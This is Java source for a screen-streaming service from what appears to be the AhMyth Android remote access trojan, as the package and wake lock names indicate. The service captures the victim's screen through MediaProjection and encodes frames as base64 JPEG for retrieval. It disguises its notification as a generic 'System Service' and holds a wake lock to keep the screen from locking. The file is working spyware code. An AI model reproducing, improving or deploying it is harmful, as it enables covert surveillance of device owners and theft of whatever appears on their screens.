package ahmyth.mine.king.ahmyth;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * Service for continuous screen streaming
 * Handles MediaProjection in a foreground service
 */
public class ScreenStreamService extends Service {
    private static final String TAG = "ScreenStream";
    private static final String CHANNEL_ID = "screen_stream_channel";
    private static final int NOTIFICATION_ID = 3001;
    
    private static ScreenStreamService instance;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private PowerManager.WakeLock wakeLock;
    
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private int quality = 50;
    private float scale = 0.5f;
    private boolean isCapturing = false;
    
    private static Intent projectionData;
    private static int projectionResultCode;
    
    public static ScreenStreamService getInstance() {
        return instance;
    }
    
    /**
     * Store projection permission result from Activity
     */
    public static void setProjectionPermission(int resultCode, Intent data) {
        projectionResultCode = resultCode;
        projectionData = data;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        handler = new Handler(Looper.getMainLooper());
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        initDisplayMetrics();
        Log.d(TAG, "ScreenStreamService created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");
        
        // Start as foreground service
        startForegroundNotification();
        
        // Start capture if we have permission
        if (projectionData != null && projectionResultCode != 0) {
            startCapture();
        }
        
        return START_STICKY;
    }
    
    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Screen Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);
            
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
        
        Notification notification = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build();
        } else {
            notification = new Notification.Builder(this)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build();
        }
        
        // On Android 14+ (API 34+), must specify foreground service type
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // API 34+ requires explicit foreground service type
            try {
                startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } catch (SecurityException e) {
                Log.e(TAG, "Failed to start foreground service with mediaProjection type: " + e.getMessage());
                // Fallback: try without type (may not work on Android 14+)
                try {
                    startForeground(NOTIFICATION_ID, notification);
                } catch (SecurityException e2) {
                    Log.e(TAG, "Failed to start foreground service: " + e2.getMessage());
                    // Service will still run, just not as foreground
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }
    
    private void initDisplayMetrics() {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            Display display = wm.getDefaultDisplay();
            DisplayMetrics metrics = new DisplayMetrics();
            display.getRealMetrics(metrics);
            
            // Ensure minimum dimensions
            int rawWidth = metrics.widthPixels;
            int rawHeight = metrics.heightPixels;
            
            screenWidth = (int) (rawWidth * scale);
            screenHeight = (int) (rawHeight * scale);
            
            // Align to 2 for ImageReader
            if (screenWidth % 2 != 0) screenWidth--;
            if (screenHeight % 2 != 0) screenHeight--;
            
            if (screenWidth <= 0) screenWidth = 480;
            if (screenHeight <= 0) screenHeight = 800;
            
            screenDensity = metrics.densityDpi;
            
            Log.d(TAG, "Screen: " + screenWidth + "x" + screenHeight + " (Raw: " + rawWidth + "x" + rawHeight + ")");
        }
    }
    
    @SuppressLint("WrongConstant")
    public void startCapture() {
        if (isCapturing) {
            Log.w(TAG, "Already capturing");
            return;
        }
        
        if (projectionData == null || projectionResultCode == 0) {
            Log.e(TAG, "No projection permission");
            return;
        }
        
        try {
            mediaProjection = projectionManager.getMediaProjection(projectionResultCode, projectionData);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to get MediaProjection");
                return;
            }
            
            // Register callback BEFORE creating VirtualDisplay (required on Android 14+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.d(TAG, "MediaProjection stopped via callback");
                        handler.post(() -> stopCapture());
                    }
                    
                    @Override
                    public void onCapturedContentResize(int width, int height) {
                        Log.d(TAG, "Content resized: " + width + "x" + height);
                    }
                    
                    @Override
                    public void onCapturedContentVisibilityChanged(boolean isVisible) {
                        Log.d(TAG, "Content visibility: " + isVisible);
                    }
                }, handler);
            } else {
                // For older Android versions
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.d(TAG, "MediaProjection stopped via callback");
                        handler.post(() -> stopCapture());
                    }
                }, handler);
            }
            
            // Create ImageReader
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            
            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenStream",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                handler
            );
            
            isCapturing = true;
            Log.d(TAG, "Screen capture started");
            
            // Acquire wake lock to prevent screen lock during streaming
            acquireWakeLock();
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting capture", e);
            stopCapture();
        }
    }
    
    /**
     * Acquire wake lock to prevent screen from locking during streaming
     */
    @SuppressWarnings("deprecation")
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager == null) {
                Log.e(TAG, "Failed to get PowerManager");
                return;
            }
            
            // Release existing wake lock if any
            releaseWakeLock();
            
            // Use SCREEN_BRIGHT_WAKE_LOCK to keep screen fully on
            // This prevents screen lock while streaming (even when power button is pressed)
            // Note: These wake lock types are deprecated but still work
            // For Android 5.0+, we could use WindowManager with FLAG_KEEP_SCREEN_ON
            // but that requires SYSTEM_ALERT_WINDOW permission
            int wakeLockFlags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE;
            
            wakeLock = powerManager.newWakeLock(wakeLockFlags, "AhMyth::ScreenStreamWakeLock");
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire();
            
            Log.d(TAG, "Wake lock acquired to prevent screen lock during streaming");
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
            // Try fallback with PARTIAL_WAKE_LOCK (keeps CPU awake but not screen)
            try {
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (powerManager != null) {
                    wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth::ScreenStreamWakeLock");
                    wakeLock.setReferenceCounted(false);
                    wakeLock.acquire();
                    Log.d(TAG, "Fallback: PARTIAL_WAKE_LOCK acquired (CPU only, screen may still lock)");
                }
            } catch (Exception e2) {
                Log.e(TAG, "Failed to acquire fallback wake lock", e2);
            }
        }
    }
    
    /**
     * Release wake lock when streaming stops
     */
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "Wake lock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error releasing wake lock", e);
        }
    }
    
    /**
     * Capture a single frame and return as base64
     */
    public JSONObject captureFrame() {
        JSONObject result = new JSONObject();
        
        try {
            if (!isCapturing || imageReader == null) {
                result.put("success", false);
                result.put("error", "Screen capture not active. Grant permission on device.");
                return result;
            }
            
            Image image = imageReader.acquireLatestImage();
            if (image == null) {
                result.put("success", false);
                result.put("error", "No image available");
                return result;
            }
            
            // Convert to bitmap
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;
            
            Bitmap bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);
            image.close();
            
            // Crop to actual size
            if (bitmap.getWidth() != screenWidth) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                bitmap.recycle();
                bitmap = cropped;
            }
            
            // Convert to base64 JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            byte[] imageBytes = baos.toByteArray();
            String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);
            
            bitmap.recycle();
            
            result.put("success", true);
            result.put("image", base64Image);
            result.put("width", screenWidth);
            result.put("height", screenHeight);
            result.put("size", imageBytes.length);
            result.put("timestamp", System.currentTimeMillis());
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        
        return result;
    }
    
    public JSONObject getScreenInfo() {
        JSONObject info = new JSONObject();
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                Display display = wm.getDefaultDisplay();
                DisplayMetrics metrics = new DisplayMetrics();
                display.getRealMetrics(metrics);
                
                info.put("width", metrics.widthPixels);
                info.put("height", metrics.heightPixels);
                info.put("scaledWidth", screenWidth);
                info.put("scaledHeight", screenHeight);
                info.put("density", metrics.density);
                info.put("densityDpi", metrics.densityDpi);
                info.put("refreshRate", display.getRefreshRate());
                info.put("rotation", display.getRotation());
                info.put("isCapturing", isCapturing);
                info.put("quality", quality);
                info.put("scale", scale);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting screen info", e);
        }
        return info;
    }
    
    public void setQuality(int q) {
        this.quality = Math.max(10, Math.min(100, q));
    }
    
    public void setScale(float s) {
        this.scale = Math.max(0.25f, Math.min(1.0f, s));
        initDisplayMetrics();
        
        // Restart capture with new size
        if (isCapturing) {
            stopCapture();
            startCapture();
        }
    }
    
    public boolean isCapturing() {
        return isCapturing;
    }
    
    public void stopCapture() {
        isCapturing = false;
        
        // Release wake lock when streaming stops
        releaseWakeLock();
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        Log.d(TAG, "Capture stopped");
    }
    
    @Override
    public void onDestroy() {
        stopCapture();
        instance = null;
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

